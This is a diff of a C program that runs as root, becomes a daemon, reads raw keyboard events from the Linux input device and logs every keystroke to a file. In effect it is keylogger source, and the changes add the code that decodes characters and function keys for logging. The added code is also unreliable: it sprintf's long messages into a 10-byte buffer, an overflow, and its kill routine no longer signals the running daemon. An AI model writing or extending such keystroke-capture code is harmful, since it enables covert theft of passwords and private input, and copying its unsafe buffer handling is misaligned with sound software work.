@@ -5,25 +5,27 @@
  * By: Eivind Bergman
  * Date: 2019-02-04
  */
-#include "stdio.h"
-#include "stdlib.h"
-#include "stdbool.h"
-#include "sys/stat.h"
-#include "sys/types.h"
-#include "sys/time.h"
-#include "sys/file.h"
-#include "sys/wait.h"
-#include "signal.h"
-#include "unistd.h"
-#include "syslog.h"
-#include "getopt.h"
-#include "string.h"
-#include "fcntl.h"
-#include "time.h"
-#include "errno.h"
-#include "error.h"
-#include "linux/input.h"
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdbool.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <sys/time.h>
+#include <sys/file.h>
+#include <sys/wait.h>
+#include <signal.h>
+#include <unistd.h>
+#include <syslog.h>
+#include <getopt.h>
+#include <string.h>
+#include <fcntl.h>
+#include <time.h>
+#include <errno.h>
+#include <error.h>
+#include <linux/input.h>
 
+//#include "args.h"
+#include "keyTables.h"
 
 #define EV_RELEASED 0
 #define EV_PRESSED 1
@@ -73,24 +75,12 @@ void set_signal_handling() {
 }
 
 void kill_process() {
-    pid_t pid;
-    bool file = true;
-
-    FILE *tmp_file = fopen(PID_FILE, "r");
-    
-    file &= (tmp_file != NULL);
-
-    if (file) {
-        file &= (fscanf(tmp_file, "%d", &pid) == 1);
-        fclose(tmp_file);
-    }
-
-    if (file) {
+    if (access(PID_FILE, F_OK) != -1) {
         remove(PID_FILE);
-        kill(pid, SIGINT);
+        signal_handler(SIGTERM);
         error(EXIT_SUCCESS, 0, "Successfully killed process.");
     } 
-    error(EXIT_FAILURE, 0, "No process killed");
+    error(EXIT_FAILURE, 0, "No process killed, file "PID_FILE" does not exist.");
 }
 
 void create_pid() {
@@ -108,10 +98,10 @@ void create_pid() {
 }
 
 
-int main() {
+int main() {//int argc, char *argv[]) {
 
     if (geteuid()) 
-        error(EXIT_FAILURE, errno, "Got r00t?");
+        error(EXIT_FAILURE, errno, "Process must be started as root.");
 
     if (access(PID_FILE, F_OK) != -1)  // PID file already exists
         error(EXIT_FAILURE, errno, "Another process already running? Quitting. (" PID_FILE ")");
@@ -120,34 +110,20 @@ int main() {
     if (input_fd == -1)
         error(EXIT_FAILURE, errno, "Error opening input event device '%s'", INPUT_EVENT_DIR);
 
-
     set_signal_handling();
-
-
-    // open log file (if file doesn't exist, create it with safe 0600 permissions)
-    umask(0177);
-    FILE *out = NULL;
-    out = fopen(LOG_FILE, "a");
-
-    if (!out)
-        error(EXIT_FAILURE, errno, "Error opening output file '%s'", LOG_FILE);
-
-
 
     if (daemon(0, 1) == -1)  // become daemon
         error(EXIT_FAILURE, errno, "Failed to become daemon");
 
-    printf("Creating pid\n");
     create_pid();
-
-
+    
     unsigned int scan_code, prev_code = 0;
     struct input_event event;
     
-    bool caps_in_effect = false;
-    bool shift_in_effect = false;
-    bool altgr_in_effect = false;
-    bool ctrl_in_effect = false;
+    bool caps_active = false;
+    bool shift_active = false;
+    bool altgr_active = false;
+    bool ctrl_active = false;
 
     int repeats = 0;
 
@@ -178,50 +154,61 @@ int main() {
 
             // Is enter or ctrl-C/D pressed?
             if (scan_code == KEY_ENTER || scan_code == KEY_KPENTER || 
-                    (ctrl_in_effect && (scan_code == KEY_C || scan_code == KEY_D))) {
-                if (ctrl_in_effect) {
+                    (ctrl_active && (scan_code == KEY_C || scan_code == KEY_D))) {
+                if (ctrl_active) {
                     log_message(LOG_FILE, "Ctrl C or D");
                     // Log C or D
                 }
+                // Can't think of any better way to to this for now.
                 goto end;
             }
 
             if (scan_code == KEY_CAPSLOCK)
-                caps_in_effect = !caps_in_effect;
+                caps_active = !caps_active;
             if (scan_code == KEY_LEFTSHIFT || scan_code == KEY_RIGHTSHIFT)
-                shift_in_effect = true;
+                shift_active = true;
             if (scan_code == KEY_RIGHTALT)
-                altgr_in_effect = true;
+                altgr_active = true;
             if (scan_code == KEY_LEFTCTRL || scan_code == KEY_RIGHTCTRL)
-                ctrl_in_effect = true;
-
-            //if (is_char_key(scan_code)) {
-            //    wchar_t wchar;
-            //    if (altgr_in_effect) {
-            //        wchar = altgr_keys[ ]
-            //    }
-            //}
-            
+                ctrl_active = true;
+                
+            char str[10];
+            if (is_char(scan_code)) {
+                char ch;
+                if (shift_active) {
+                    ch = char_shift_keys[get_char_index(scan_code)];
+                } else {
+                    ch = char_keys[get_char_index(scan_code)];
+                }
+                sprintf(str, "Character key pressed: %c", ch);
+                log_message(LOG_FILE, str);
+            } else if(is_func(scan_code)) {
+                sprintf(str, "Function key pressed: %s", func_keys[get_func_index(scan_code)]);
+                log_message(LOG_FILE, str);
+            } else {
+                sprintf(str, "Key is not char nor func, must be reserved (%d)", scan_code);
+                log_message(LOG_FILE, str);
+            }
 
 
         } // if (event.value == EV_MAKE) end
         
         if (event.value == EV_RELEASED) {
             if (scan_code == KEY_LEFTSHIFT || scan_code == KEY_RIGHTSHIFT) {
-                shift_in_effect = false;
+                shift_active = false;
             }
             if (scan_code == KEY_RIGHTALT) {
-                altgr_in_effect = false;
+                altgr_active = false;
             }
             if (scan_code == KEY_LEFTCTRL || scan_code == KEY_RIGHTCTRL) {
-                ctrl_in_effect = false;
+                ctrl_active = false;
             }
         }
         end:
         prev_code = scan_code;
 
     }
-    log_message(LOG_FILE, "Received Signal, shutting down gracefully.");
+    log_message(LOG_FILE, "Received SIGTERM, shutting down gracefully.");
     remove(PID_FILE);
     exit(EXIT_SUCCESS);
 }
